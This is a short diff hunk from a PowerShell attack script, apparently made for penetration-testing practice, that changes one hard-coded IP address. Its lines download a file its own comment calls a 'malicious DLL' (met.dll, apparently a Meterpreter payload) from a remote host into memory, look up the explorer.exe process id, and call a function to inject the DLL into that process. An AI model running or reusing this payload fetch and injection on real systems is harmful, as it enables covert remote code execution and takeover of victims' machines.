@@ -2886,7 +2886,7 @@ Main
 }
 
 #Storing the malicious DLL contents into a bytearray and resolving the explorer.exe PID
-$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.82/met.dll')
+$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.1/met.dll')
 $procid = (Get-Process -Name explorer).Id
 
 #Finally invoking the function with the parameters specified
